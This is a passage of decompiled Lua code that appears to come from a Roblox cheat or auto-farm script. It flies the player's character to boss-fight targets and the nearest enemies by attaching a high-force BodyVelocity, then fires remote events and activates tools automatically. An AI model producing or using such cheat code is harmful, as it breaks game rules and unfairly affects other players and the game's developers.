                                                                    korth_result = capture_1_156174.value
                                                                    ipairs_3 = health_4
                                                                    korth_result(ipairs_3)
                                                                    korth_result = true
                                                                    capture_1_156170.value = korth_result
                                                                end
                                                            else
                                                                humanoid_4 = true
                                                                capture_1_156170.value = humanoid_4
                                                            end
                                                        else
                                                            humanoid_4 = true
                                                            capture_1_156170.value = humanoid_4
                                                        end
                                                    end
                                                end
                                                humanoid_4 = capture_1_156169.value
                                                if humanoid_4 then
                                                    humanoid_4 = capture_1_156170.value
                                                    if humanoid_4 then
                                                        humanoid_4 = val_169
                                                        korth_result = humanoid_4
                                                        if humanoid_4 then
                                                            humanoid_4 = humanoid_4.FindFirstChild
                                                        else
                                                            humanoid_4 = nil
                                                        end
                                                        ipairs_3 = "Atticus"
                                                        humanoid_4 = humanoid_4(korth_result, ipairs_3)
                                                        if humanoid_4 then
                                                            vaultTarget = humanoid_4
                                                        end
                                                    end
                                                end
                                            else
                                                korth = val_170()
                                                if (korth == "HauntedTundra") then
                                                    korth = capture_1_156165.value
                                                    if (korth == 11.0) then
                                                        korth = val_169
                                                        health_4 = korth
                                                        if korth then
                                                            korth = korth.FindFirstChild
                                                        else
                                                            korth = nil
                                                        end
                                                        humanoid_4 = "AkumaBossFight"
                                                        korth = korth(health_4, humanoid_4)
                                                        if korth then
                                                            vaultTarget = korth
                                                        end
                                                    else
                                                        korth = val_170()
                                                        if (korth == "HauntedTundra") then
                                                            korth = capture_1_156165.value
                                                            if (korth == 17.0) then
                                                                korth = (capture_1_156168.value)()
                                                                if korth then
                                                                    vaultTarget = korth
                                                                else
                                                                    health_4 = workspace
                                                                    humanoid_4 = health_4
                                                                    health_4 = health_4.FindFirstChild
                                                                    korth_result = "KoriBossFight"
                                                                    health_4 = health_4(humanoid_4, korth_result)
                                                                    if health_4 then
                                                                        health_4 = workspace.KoriBossFight
                                                                        humanoid_4 = health_4
                                                                        if health_4 then
                                                                            health_4 = health_4.FindFirstChild
                                                                        else
                                                                            health_4 = nil
                                                                        end
                                                                        korth_result = "StartKoriFightZone"
                                                                        health_4 = health_4(humanoid_4, korth_result)
                                                                    end
                                                                    if health_4 then
                                                                        vaultTarget = health_4
                                                                    end
                                                                end
                                                            end
                                                        end
                                                    end
                                                else
                                                    korth = val_170()
                                                    if (korth == "HauntedTundra") then
                                                        korth = capture_1_156165.value
                                                        if (korth == 17.0) then
                                                            korth = (capture_1_156168.value)()
                                                            if korth then
                                                                vaultTarget = korth
                                                            else
                                                                health_4 = workspace
                                                                humanoid_4 = health_4
                                                                health_4 = health_4.FindFirstChild
                                                                korth_result = "KoriBossFight"
                                                                health_4 = health_4(humanoid_4, korth_result)
                                                                if health_4 then
                                                                    health_4 = workspace.KoriBossFight
                                                                    humanoid_4 = health_4
                                                                    if health_4 then
                                                                        health_4 = health_4.FindFirstChild
                                                                    else
                                                                        health_4 = nil
                                                                    end
                                                                    korth_result = "StartKoriFightZone"
                                                                    health_4 = health_4(humanoid_4, korth_result)
                                                                end
                                                                if health_4 then
                                                                    vaultTarget = health_4
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        else
                                            korth = val_170()
                                            if (korth == "HauntedTundra") then
                                                korth = capture_1_156165.value
                                                if (korth == 11.0) then
                                                    korth = val_169
                                                    health_4 = korth
                                                    if korth then
                                                        korth = korth.FindFirstChild
                                                    else
                                                        korth = nil
                                                    end
                                                    humanoid_4 = "AkumaBossFight"
                                                    korth = korth(health_4, humanoid_4)
                                                    if korth then
                                                        vaultTarget = korth
                                                    end
                                                else
                                                    korth = val_170()
                                                    if (korth == "HauntedTundra") then
                                                        korth = capture_1_156165.value
                                                        if (korth == 17.0) then
                                                            korth = (capture_1_156168.value)()
                                                            if korth then
                                                                vaultTarget = korth
                                                            else
                                                                health_4 = workspace
                                                                humanoid_4 = health_4
                                                                health_4 = health_4.FindFirstChild
                                                                korth_result = "KoriBossFight"
                                                                health_4 = health_4(humanoid_4, korth_result)
                                                                if health_4 then
                                                                    health_4 = workspace.KoriBossFight
                                                                    humanoid_4 = health_4
                                                                    if health_4 then
                                                                        health_4 = health_4.FindFirstChild
                                                                    else
                                                                        health_4 = nil
                                                                    end
                                                                    korth_result = "StartKoriFightZone"
                                                                    health_4 = health_4(humanoid_4, korth_result)
                                                                end
                                                                if health_4 then
                                                                    vaultTarget = health_4
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            else
                                                korth = val_170()
                                                if (korth == "HauntedTundra") then
                                                    korth = capture_1_156165.value
                                                    if (korth == 17.0) then
                                                        korth = (capture_1_156168.value)()
                                                        if korth then
                                                            vaultTarget = korth
                                                        else
                                                            health_4 = workspace
                                                            humanoid_4 = health_4
                                                            health_4 = health_4.FindFirstChild
                                                            korth_result = "KoriBossFight"
                                                            health_4 = health_4(humanoid_4, korth_result)
                                                            if health_4 then
                                                                health_4 = workspace.KoriBossFight
                                                                humanoid_4 = health_4
                                                                if health_4 then
                                                                    health_4 = health_4.FindFirstChild
                                                                else
                                                                    health_4 = nil
                                                                end
                                                                korth_result = "StartKoriFightZone"
                                                                health_4 = health_4(humanoid_4, korth_result)
                                                            end
                                                            if health_4 then
                                                                vaultTarget = health_4
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                    korth = vaultTarget
                                    if not korth then
                                        korth = throneFlightPos
                                        if korth then
                                            korth = capture_1_156162.value
                                            health_4 = korth
                                            if korth then
                                                korth = korth.FindFirstChild
                                            else
                                                korth = nil
                                            end
                                            korth = korth(health_4, "BV")
                                            if not korth then
                                                korth = Instance.new
                                                health_4 = "BodyVelocity"
                                                korth = korth(health_4)
                                            end
                                            if korth then
                                                korth.Name = "BV"
                                            end
                                            health_4 = Vector3.new
                                            humanoid_4 = 100000.0
                                            korth_result = 100000.0
                                            ipairs_3 = 100000.0
                                            health_4 = health_4(humanoid_4, korth_result, ipairs_3)
                                            if korth then
                                                korth.MaxForce = health_4
                                            end
                                            health_4 = capture_1_156162.value
                                            if korth then
                                                korth.Parent = health_4
                                            end
                                            health_4 = nil
                                            humanoid_4 = val_170()
                                            if (humanoid_4 == "HauntedTundra") then
                                                humanoid_4 = vaultTarget
                                                korth_result = val_169
                                                ipairs_3 = korth_result
                                                if korth_result then
                                                    korth_result = korth_result.FindFirstChild
                                                else
                                                    korth_result = nil
                                                end
                                                name_2 = "AkumaBossFight"
                                                korth_result = korth_result(ipairs_3, name_2)
                                                if humanoid_4 ~= korth_result then
                                                    humanoid_4 = false
                                                else
                                                    humanoid_4 = true
                                                end
                                            else
                                                humanoid_4 = false
                                            end
                                            korth_result = vaultTarget
                                            if korth_result then
                                                korth_result = vaultTarget
                                                if korth_result ~= nil then
                                                    korth_result = korth_result.Name
                                                else
                                                    korth_result = nil
                                                end
                                                if (korth_result == "basehitbox") then
                                                    korth_result = vaultTarget
                                                    if korth_result ~= nil then
                                                        korth_result = korth_result.Parent
                                                    else
                                                        korth_result = nil
                                                    end
                                                    if korth_result ~= nil then
                                                        korth_result = korth_result.Name
                                                    else
                                                        korth_result = nil
                                                    end
                                                    if korth_result ~= "BookHand" then
                                                        korth_result = false
                                                    else
                                                        korth_result = true
                                                    end
                                                else
                                                    korth_result = false
                                                end
                                            end
                                            ipairs_3 = val_172
                                            name_2 = throneFlightPos
                                            if name_2 then
                                                name_2 = capture_1_156176.value
                                                get_pivot_2 = throneFlightPos
                                                name_2 = name_2(get_pivot_2)
                                                health_4 = name_2
                                            else
                                                if humanoid_4 then
                                                    name_2 = vaultTarget
                                                    get_pivot_2 = name_2
                                                    if name_2 then
                                                        name_2 = name_2.GetPivot
                                                    else
                                                        name_2 = nil
                                                    end
                                                    name_2 = name_2(get_pivot_2)
                                                    if name_2 ~= nil then
                                                        name_2 = name_2.Position
                                                    else
                                                        name_2 = nil
                                                    end
                                                    get_pivot_2 = Vector3.new
                                                    basehitbox = capture_1_156162.value
                                                    if basehitbox ~= nil then
                                                        basehitbox = basehitbox.Position
                                                    else
                                                        basehitbox = nil
                                                    end
                                                    if basehitbox ~= nil then
                                                        basehitbox = basehitbox.X
                                                    else
                                                        basehitbox = nil
                                                    end
                                                    ipairs_4 = 0.0
                                                    name_3 = capture_1_156162.value
                                                    if name_3 ~= nil then
                                                        name_3 = name_3.Position
                                                    else
                                                        name_3 = nil
                                                    end
                                                    if name_3 ~= nil then
                                                        name_3 = name_3.Z
                                                    else
                                                        name_3 = nil
                                                    end
                                                    get_pivot_2 = get_pivot_2(basehitbox, ipairs_4, name_3)
                                                    basehitbox = Vector3.new
                                                    if name_2 ~= nil then
                                                        ipairs_4 = name_2.X
                                                    else
                                                        ipairs_4 = nil
                                                    end
                                                    name_3 = 0.0
                                                    if name_2 ~= nil then
                                                        get_pivot_3 = name_2.Z
                                                    else
                                                        get_pivot_3 = nil
                                                    end
                                                    basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                    get_pivot_2 = (get_pivot_2) - (basehitbox)
                                                    if get_pivot_2 ~= nil then
                                                        get_pivot_2 = get_pivot_2.Magnitude
                                                    else
                                                        get_pivot_2 = nil
                                                    end
                                                    if (30.0 < get_pivot_2) then
                                                        basehitbox = capture_1_156176.value
                                                        ipairs_4 = Vector3.new
                                                        name_3 = 0.0
                                                        get_pivot_3 = 5.0
                                                        ipairs_4_result = 0.0
                                                        ipairs_4 = ipairs_4(name_3, get_pivot_3, ipairs_4_result)
                                                        ipairs_4 = (name_2) + (ipairs_4)
                                                        basehitbox = basehitbox(ipairs_4)
                                                        health_4 = basehitbox
                                                    else
                                                        basehitbox = (tick()) * (12.0)
                                                        ipairs_4 = 12.0
                                                        name_3 = 22.0
                                                        get_pivot_3 = Vector3.new
                                                        ipairs_4_result = math
                                                        if ipairs_4_result ~= nil then
                                                            ipairs_4_result = ipairs_4_result.cos
                                                        else
                                                            ipairs_4_result = nil
                                                        end
                                                        ipairs_4_result = (ipairs_4_result(basehitbox)) * (ipairs_4)
                                                        val_180 = name_3
                                                        magnitude = math
                                                        if magnitude ~= nil then
                                                            magnitude = magnitude.sin
                                                        else
                                                            magnitude = nil
                                                        end
                                                        val_181 = basehitbox
                                                        magnitude = (magnitude(val_181)) * (ipairs_4)
                                                        get_pivot_3 = get_pivot_3(ipairs_4_result, val_180, magnitude)
                                                        health_4 = (name_2) + (get_pivot_3)
                                                        ipairs_3 = 120.0
                                                    end
                                                else
                                                    if korth_result then
                                                        name_2 = capture_1_156176.value
                                                        get_pivot_2 = vaultTarget
                                                        basehitbox = get_pivot_2
                                                        if get_pivot_2 then
                                                            get_pivot_2 = get_pivot_2.GetPivot
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        get_pivot_2 = get_pivot_2(basehitbox)
                                                        if get_pivot_2 ~= nil then
                                                            get_pivot_2 = get_pivot_2.Position
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        name_2 = name_2(get_pivot_2)
                                                        health_4 = name_2
                                                    else
                                                        name_2 = capture_1_156176.value
                                                        get_pivot_2 = vaultTarget
                                                        basehitbox = get_pivot_2
                                                        if get_pivot_2 then
                                                            get_pivot_2 = get_pivot_2.GetPivot
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        get_pivot_2 = get_pivot_2(basehitbox)
                                                        if get_pivot_2 ~= nil then
                                                            get_pivot_2 = get_pivot_2.Position
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        basehitbox = Vector3.new
                                                        ipairs_4 = 0.0
                                                        name_3 = 5.0
                                                        get_pivot_3 = 0.0
                                                        basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                        get_pivot_2 = (get_pivot_2) + (basehitbox)
                                                        name_2 = name_2(get_pivot_2)
                                                        health_4 = name_2
                                                    end
                                                end
                                            end
                                            name_2 = capture_1_156162.value
                                            if name_2 ~= nil then
                                                name_2 = name_2.Position
                                            else
                                                name_2 = nil
                                            end
                                            name_2 = (health_4) - (name_2)
                                            if name_2 ~= nil then
                                                name_2 = name_2.Unit
                                            else
                                                name_2 = nil
                                            end
                                            get_pivot_2 = capture_1_156162.value
                                            if get_pivot_2 ~= nil then
                                                get_pivot_2 = get_pivot_2.Position
                                            else
                                                get_pivot_2 = nil
                                            end
                                            get_pivot_2 = (health_4) - (get_pivot_2)
                                            if get_pivot_2 ~= nil then
                                                get_pivot_2 = get_pivot_2.Magnitude
                                            else
                                                get_pivot_2 = nil
                                            end
                                            if (2.0 < get_pivot_2) then
                                                basehitbox = (name_2) * (ipairs_3)
                                                if korth then
                                                    korth.Velocity = basehitbox
                                                end
                                            else
                                                basehitbox = Vector3.zero
                                                if korth then
                                                    korth.Velocity = basehitbox
                                                end
                                            end
                                            basehitbox = capture_1_156163.value
                                            if basehitbox then
                                                basehitbox.PlatformStand = true
                                            end
                                            if korth_result then
                                                basehitbox = pcall
                                                local capture_77_186113_2, capture_77_186114_2 = val_173, val_174
                                                ipairs_4 = function()
                                                    local activate, tool_3
                                                    local fire_server_9 = capture_77_186113_2.value
                                                    if fire_server_9 then
                                                        fire_server_9 = capture_77_186113_2.value
                                                        activate = fire_server_9
                                                        if fire_server_9 then
                                                            fire_server_9 = fire_server_9.FireServer
                                                        else
                                                            fire_server_9 = nil
                                                        end
                                                        fire_server_9(activate)
                                                    end
                                                    fire_server_9 = capture_77_186114_2.value
                                                    if fire_server_9 then
                                                        fire_server_9 = capture_77_186114_2.value
                                                        activate = fire_server_9
                                                        if fire_server_9 then
                                                            fire_server_9 = fire_server_9.FindFirstChildOfClass
                                                        else
                                                            fire_server_9 = nil
                                                        end
                                                        tool_3 = "Tool"
                                                        fire_server_9 = fire_server_9(activate, tool_3)
                                                    end
                                                    if fire_server_9 then
                                                        tool_3 = fire_server_9
                                                        if fire_server_9 then
                                                            activate = fire_server_9.Activate
                                                        else
                                                            activate = nil
                                                        end
                                                        activate(tool_3)
                                                    end
                                                    return
                                                end
                                                basehitbox(ipairs_4)
                                            else
                                                basehitbox = vaultTarget
                                                if basehitbox then
                                                    basehitbox = vaultTarget
                                                    ipairs_4 = basehitbox
                                                    if basehitbox then
                                                        basehitbox = basehitbox.FindFirstChildOfClass
                                                    else
                                                        basehitbox = nil
                                                    end
                                                    name_3 = "Humanoid"
                                                    basehitbox = basehitbox(ipairs_4, name_3)
                                                    if basehitbox then
                                                        basehitbox = val_175
                                                        basehitbox()
                                                    end
                                                end
                                            end
                                        else
                                            if value_19 then
                                                korth = val_176(value_19)
                                                health_4 = #(korth)
                                                if (health_4 == 0.0) then
                                                    health_4 = (capture_1_156181.value)(value_19)
                                                    humanoid_4 = val_177
                                                    korth_result = health_4
                                                    humanoid_4 = humanoid_4(korth_result)
                                                    korth = humanoid_4
                                                end
                                                health_4 = capture_1_156162.value
                                                humanoid_4 = health_4
                                                if health_4 then
                                                    health_4 = health_4.FindFirstChild
                                                else
                                                    health_4 = nil
                                                end
                                                health_4 = health_4(humanoid_4, "BV")
                                                if not health_4 then
                                                    health_4 = Instance.new
                                                    humanoid_4 = "BodyVelocity"
                                                    health_4 = health_4(humanoid_4)
                                                end
                                                if health_4 then
                                                    health_4.Name = "BV"
                                                end
                                                humanoid_4 = Vector3.new
                                                korth_result = 100000.0
                                                ipairs_3 = 100000.0
                                                name_2 = 100000.0
                                                humanoid_4 = humanoid_4(korth_result, ipairs_3, name_2)
                                                if health_4 then
                                                    health_4.MaxForce = humanoid_4
                                                end
                                                humanoid_4 = capture_1_156162.value
                                                if health_4 then
                                                    health_4.Parent = humanoid_4
                                                end
                                                humanoid_4 = #(korth)
                                                if (0.0 < humanoid_4) then
                                                    humanoid_4 = nil
                                                    korth_result = math
                                                    if korth_result ~= nil then
                                                        korth_result = korth_result.huge
                                                    else
                                                        korth_result = nil
                                                    end
                                                    ipairs_3 = pairs
                                                    name_2 = korth
                                                    ipairs_3 = ipairs_3(name_2)
                                                    while true do
                                                        basehitbox = ipairs_3(name_2, get_pivot_2)
                                                        if basehitbox ~= nil then
                                                            get_pivot_2 = basehitbox
                                                            get_pivot_3 = ipairs_4
                                                            if ipairs_4 then
                                                                name_3 = ipairs_4.FindFirstChild
                                                            else
                                                                name_3 = nil
                                                            end
                                                            ipairs_4_result = "HumanoidRootPart"
                                                            name_3 = name_3(get_pivot_3, ipairs_4_result)
                                                            if name_3 then
                                                                get_pivot_3 = capture_1_156162.value
                                                                if get_pivot_3 ~= nil then
                                                                    get_pivot_3 = get_pivot_3.Position
                                                                else
                                                                    get_pivot_3 = nil
                                                                end
                                                                if name_3 ~= nil then
                                                                    ipairs_4_result = name_3.Position
                                                                else
                                                                    ipairs_4_result = nil
                                                                end
                                                                get_pivot_3 = (get_pivot_3) - (ipairs_4_result)
                                                                if get_pivot_3 ~= nil then
                                                                    get_pivot_3 = get_pivot_3.Magnitude
                                                                else
                                                                    get_pivot_3 = nil
                                                                end
                                                                if (get_pivot_3 < korth_result) then
                                                                    korth_result = get_pivot_3
                                                                    humanoid_4 = ipairs_4
                                                                end
                                                            end
                                                        else
                                                            break
                                                        end
                                                    end
                                                    if humanoid_4 then
                                                        name_2 = humanoid_4
                                                        if humanoid_4 then
                                                            ipairs_3 = humanoid_4.FindFirstChild
                                                        else
                                                            ipairs_3 = nil
                                                        end
                                                        get_pivot_2 = "HumanoidRootPart"
                                                        ipairs_3 = ipairs_3(name_2, get_pivot_2)
                                                        if ipairs_3 then
                                                            name_2 = capture_1_156176.value
                                                            if ipairs_3 ~= nil then
                                                                get_pivot_2 = ipairs_3.Position
                                                            else
                                                                get_pivot_2 = nil
                                                            end
                                                            basehitbox = Vector3.new
                                                            ipairs_4 = 0.0
                                                            name_3 = 10.0
                                                            get_pivot_3 = 0.0
                                                            basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                            name_2 = name_2((get_pivot_2) + (basehitbox))
                                                            get_pivot_2 = capture_1_156162.value
                                                            if get_pivot_2 ~= nil then
                                                                get_pivot_2 = get_pivot_2.Position
                                                            else
                                                                get_pivot_2 = nil
                                                            end
                                                            get_pivot_2 = (name_2) - (get_pivot_2)
                                                            if get_pivot_2 ~= nil then
                                                                get_pivot_2 = get_pivot_2.Magnitude
                                                            else
                                                                get_pivot_2 = nil
                                                            end
                                                            if (2.0 < get_pivot_2) then
                                                                basehitbox = capture_1_156162.value
                                                                if basehitbox ~= nil then
                                                                    basehitbox = basehitbox.Position
                                                                else
                                                                    basehitbox = nil
                                                                end
                                                                basehitbox = (name_2) - (basehitbox)
                                                                if basehitbox ~= nil then
                                                                    basehitbox = basehitbox.Unit
                                                                else
                                                                    basehitbox = nil
                                                                end
                                                                ipairs_4 = val_172
                                                                ipairs_4 = (basehitbox) * (ipairs_4)
                                                                if health_4 then
                                                                    health_4.Velocity = ipairs_4
                                                                end
                                                            else
                                                                basehitbox = Vector3.zero
                                                                if health_4 then
                                                                    health_4.Velocity = basehitbox
                                                                end
                                                            end
                                                            basehitbox = capture_1_156163.value
                                                            if basehitbox then
                                                                basehitbox.PlatformStand = true
                                                            end
                                                        end
                                                    end
                                                    ipairs_3 = val_175
                                                    ipairs_3()
                                                else
                                                    humanoid_4 = capture_1_156176.value
                                                    ipairs_3 = value_19
                                                    if value_19 then
                                                        korth_result = value_19.GetPivot
                                                    else
                                                        korth_result = nil
                                                    end
                                                    korth_result = korth_result(ipairs_3)
                                                    if korth_result ~= nil then
                                                        korth_result = korth_result.Position
                                                    else
                                                        korth_result = nil
                                                    end
                                                    ipairs_3 = Vector3.new
                                                    name_2 = 0.0
                                                    get_pivot_2 = 10.0
                                                    basehitbox = 0.0
                                                    ipairs_3 = ipairs_3(name_2, get_pivot_2, basehitbox)
                                                    humanoid_4 = humanoid_4((korth_result) + (ipairs_3))
                                                    korth_result = capture_1_156162.value
                                                    if korth_result ~= nil then
                                                        korth_result = korth_result.Position
                                                    else
                                                        korth_result = nil
                                                    end
                                                    korth_result = (korth_result) - (humanoid_4)
                                                    if korth_result ~= nil then
                                                        korth_result = korth_result.Magnitude
                                                    else
                                                        korth_result = nil
                                                    end
                                                    if (5.0 < korth_result) then
                                                        ipairs_3 = capture_1_156162.value
                                                        if ipairs_3 ~= nil then
                                                            ipairs_3 = ipairs_3.Position
                                                        else
                                                            ipairs_3 = nil
                                                        end
                                                        ipairs_3 = (humanoid_4) - (ipairs_3)
                                                        if ipairs_3 ~= nil then
                                                            ipairs_3 = ipairs_3.Unit
                                                        else
                                                            ipairs_3 = nil
                                                        end
                                                        name_2 = val_172
                                                        name_2 = (ipairs_3) * (name_2)
                                                        if health_4 then
                                                            health_4.Velocity = name_2
                                                        end
                                                        name_2 = capture_1_156163.value
                                                        if name_2 then
                                                            name_2.PlatformStand = true
                                                        end
                                                    else
                                                        ipairs_3 = Vector3.zero
                                                        if health_4 then
                                                            health_4.Velocity = ipairs_3
                                                        end
                                                    end
                                                end
                                            else
                                                korth = val_177
                                                health_4 = math
                                                if health_4 ~= nil then
                                                    health_4 = health_4.huge
                                                else
                                                    health_4 = nil
                                                end
                                                korth = korth(health_4)
                                                health_4 = #(korth)
                                                if (0.0 < health_4) then
                                                    health_4 = nil
                                                    humanoid_4 = math
                                                    if humanoid_4 ~= nil then
                                                        humanoid_4 = humanoid_4.huge
                                                    else
                                                        humanoid_4 = nil
                                                    end
                                                    korth_result = pairs
                                                    ipairs_3 = korth
                                                    korth_result = korth_result(ipairs_3)
                                                    while true do
                                                        get_pivot_2 = korth_result(ipairs_3, name_2)
                                                        if get_pivot_2 ~= nil then
                                                            name_2 = get_pivot_2
                                                            name_3 = basehitbox
                                                            if basehitbox then
                                                                ipairs_4 = basehitbox.FindFirstChild
                                                            else
                                                                ipairs_4 = nil
                                                            end
                                                            get_pivot_3 = "HumanoidRootPart"
                                                            ipairs_4 = ipairs_4(name_3, get_pivot_3)
                                                            if ipairs_4 then
                                                                name_3 = capture_1_156162.value
                                                                if name_3 ~= nil then
                                                                    name_3 = name_3.Position
                                                                else
                                                                    name_3 = nil
                                                                end
                                                                if ipairs_4 ~= nil then
                                                                    get_pivot_3 = ipairs_4.Position
                                                                else
                                                                    get_pivot_3 = nil
                                                                end
                                                                name_3 = (name_3) - (get_pivot_3)
                                                                if name_3 ~= nil then
                                                                    name_3 = name_3.Magnitude
                                                                else
                                                                    name_3 = nil
                                                                end
                                                                if (name_3 < humanoid_4) then
                                                                    humanoid_4 = name_3
                                                                    health_4 = basehitbox
                                                                end
                                                            end
                                                        else
                                                            break
                                                        end
                                                    end
                                                    korth_result = capture_1_156162.value
                                                    ipairs_3 = korth_result
                                                    if korth_result then
                                                        korth_result = korth_result.FindFirstChild
                                                    else
                                                        korth_result = nil
                                                    end
                                                    korth_result = korth_result(ipairs_3, "BV")
                                                    if not korth_result then
                                                        korth_result = Instance.new
                                                        ipairs_3 = "BodyVelocity"
                                                        korth_result = korth_result(ipairs_3)
                                                    end
                                                    if korth_result then
                                                        korth_result.Name = "BV"
                                                    end
                                                    ipairs_3 = Vector3.new
                                                    name_2 = 100000.0
                                                    get_pivot_2 = 100000.0
                                                    basehitbox = 100000.0
                                                    ipairs_3 = ipairs_3(name_2, get_pivot_2, basehitbox)
                                                    if korth_result then
                                                        korth_result.MaxForce = ipairs_3
                                                    end
                                                    ipairs_3 = capture_1_156162.value
                                                    if korth_result then
                                                        korth_result.Parent = ipairs_3
                                                    end
                                                    if health_4 then
                                                        name_2 = health_4
                                                        if health_4 then
                                                            ipairs_3 = health_4.FindFirstChild
                                                        else
                                                            ipairs_3 = nil
                                                        end
                                                        get_pivot_2 = "HumanoidRootPart"
                                                        ipairs_3 = ipairs_3(name_2, get_pivot_2)
                                                        if ipairs_3 then
                                                            name_2 = capture_1_156176.value
                                                            if ipairs_3 ~= nil then
                                                                get_pivot_2 = ipairs_3.Position
                                                            else
                                                                get_pivot_2 = nil
                                                            end
                                                            basehitbox = Vector3.new
                                                            ipairs_4 = 0.0
                                                            name_3 = 10.0
                                                            get_pivot_3 = 0.0
                                                            basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                            name_2 = name_2((get_pivot_2) + (basehitbox))
                                                            get_pivot_2 = capture_1_156162.value
                                                            if get_pivot_2 ~= nil then
                                                                get_pivot_2 = get_pivot_2.Position
                                                            else
                                                                get_pivot_2 = nil
                                                            end
                                                            get_pivot_2 = (name_2) - (get_pivot_2)
                                                            if get_pivot_2 ~= nil then
                                                                get_pivot_2 = get_pivot_2.Magnitude
                                                            else
                                                                get_pivot_2 = nil
                                                            end
                                                            if (2.0 < get_pivot_2) then
                                                                basehitbox = capture_1_156162.value
                                                                if basehitbox ~= nil then
                                                                    basehitbox = basehitbox.Position
                                                                else
                                                                    basehitbox = nil
                                                                end
                                                                basehitbox = (name_2) - (basehitbox)
                                                                if basehitbox ~= nil then
                                                                    basehitbox = basehitbox.Unit
                                                                else
                                                                    basehitbox = nil
                                                                end
                                                                ipairs_4 = val_172
                                                                ipairs_4 = (basehitbox) * (ipairs_4)
                                                                if korth_result then
                                                                    korth_result.Velocity = ipairs_4
                                                                end
                                                            else
                                                                basehitbox = Vector3.zero
                                                                if korth_result then
                                                                    korth_result.Velocity = basehitbox
                                                                end
                                                            end
                                                            basehitbox = capture_1_156163.value
                                                            if basehitbox then
                                                                basehitbox.PlatformStand = true
                                                            end
                                                        end
                                                    else
                                                        ipairs_3 = Vector3.zero
                                                        if korth_result then
                                                            korth_result.Velocity = ipairs_3
                                                        end
                                                    end
                                                    ipairs_3 = val_175
                                                    ipairs_3()
                                                else
                                                    health_4 = capture_1_156162.value
                                                    if health_4 then
                                                        health_4 = capture_1_156162.value
                                                        humanoid_4 = health_4
                                                        if health_4 then
                                                            health_4 = health_4.FindFirstChild
                                                        else
                                                            health_4 = nil
                                                        end
                                                        korth_result = "BV"
                                                        health_4 = health_4(humanoid_4, korth_result)
                                                        if health_4 then
                                                            korth_result = health_4
                                                            if health_4 then
                                                                humanoid_4 = health_4.Destroy
                                                            else
                                                                humanoid_4 = nil
                                                            end
                                                            humanoid_4(korth_result)
                                                        end
                                                    end
                                                    health_4 = capture_1_156163.value
                                                    if health_4 then
                                                        health_4 = capture_1_156163.value
                                                        if health_4 then
                                                            health_4.PlatformStand = false
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    else
                                        korth = capture_1_156162.value
                                        health_4 = korth
                                        if korth then
                                            korth = korth.FindFirstChild
                                        else
                                            korth = nil
                                        end
                                        korth = korth(health_4, "BV")
                                        if not korth then
                                            korth = Instance.new
                                            health_4 = "BodyVelocity"
                                            korth = korth(health_4)
                                        end
                                        if korth then
                                            korth.Name = "BV"
                                        end
                                        health_4 = Vector3.new
                                        humanoid_4 = 100000.0
                                        korth_result = 100000.0
                                        ipairs_3 = 100000.0
                                        health_4 = health_4(humanoid_4, korth_result, ipairs_3)
                                        if korth then
                                            korth.MaxForce = health_4
                                        end
                                        health_4 = capture_1_156162.value
                                        if korth then
                                            korth.Parent = health_4
                                        end
                                        health_4 = nil
                                        humanoid_4 = val_170()
                                        if (humanoid_4 == "HauntedTundra") then
                                            humanoid_4 = vaultTarget
                                            korth_result = val_169
                                            ipairs_3 = korth_result
                                            if korth_result then
                                                korth_result = korth_result.FindFirstChild
                                            else
                                                korth_result = nil
                                            end
                                            name_2 = "AkumaBossFight"
                                            korth_result = korth_result(ipairs_3, name_2)
                                            if humanoid_4 ~= korth_result then
                                                humanoid_4 = false
                                            else
                                                humanoid_4 = true
                                            end
                                        else
                                            humanoid_4 = false
                                        end
                                        korth_result = vaultTarget
                                        if korth_result then
                                            korth_result = vaultTarget
                                            if korth_result ~= nil then
                                                korth_result = korth_result.Name
                                            else
                                                korth_result = nil
                                            end
                                            if (korth_result == "basehitbox") then
                                                korth_result = vaultTarget
                                                if korth_result ~= nil then
                                                    korth_result = korth_result.Parent
                                                else
                                                    korth_result = nil
                                                end
                                                if korth_result ~= nil then
                                                    korth_result = korth_result.Name
                                                else
                                                    korth_result = nil
                                                end
                                                if korth_result ~= "BookHand" then
                                                    korth_result = false
                                                else
                                                    korth_result = true
                                                end
                                            else
                                                korth_result = false
                                            end
                                        end
                                        ipairs_3 = val_172
                                        name_2 = throneFlightPos
                                        if name_2 then
                                            name_2 = capture_1_156176.value
                                            get_pivot_2 = throneFlightPos
                                            name_2 = name_2(get_pivot_2)
                                            health_4 = name_2
                                        else
                                            if humanoid_4 then
                                                name_2 = vaultTarget
                                                get_pivot_2 = name_2
                                                if name_2 then
                                                    name_2 = name_2.GetPivot
                                                else
                                                    name_2 = nil
                                                end
                                                name_2 = name_2(get_pivot_2)
                                                if name_2 ~= nil then
                                                    name_2 = name_2.Position
                                                else
                                                    name_2 = nil
                                                end
                                                get_pivot_2 = Vector3.new
                                                basehitbox = capture_1_156162.value
                                                if basehitbox ~= nil then
                                                    basehitbox = basehitbox.Position
                                                else
                                                    basehitbox = nil
                                                end
                                                if basehitbox ~= nil then
                                                    basehitbox = basehitbox.X
                                                else
                                                    basehitbox = nil
                                                end
                                                ipairs_4 = 0.0
                                                name_3 = capture_1_156162.value
                                                if name_3 ~= nil then
                                                    name_3 = name_3.Position
                                                else
                                                    name_3 = nil
                                                end
                                                if name_3 ~= nil then
                                                    name_3 = name_3.Z
                                                else
                                                    name_3 = nil
                                                end
                                                get_pivot_2 = get_pivot_2(basehitbox, ipairs_4, name_3)
                                                basehitbox = Vector3.new
                                                if name_2 ~= nil then
                                                    ipairs_4 = name_2.X
                                                else
                                                    ipairs_4 = nil
                                                end
                                                name_3 = 0.0
                                                if name_2 ~= nil then
                                                    get_pivot_3 = name_2.Z
                                                else
                                                    get_pivot_3 = nil
                                                end
                                                basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                get_pivot_2 = (get_pivot_2) - (basehitbox)
                                                if get_pivot_2 ~= nil then
                                                    get_pivot_2 = get_pivot_2.Magnitude
                                                else
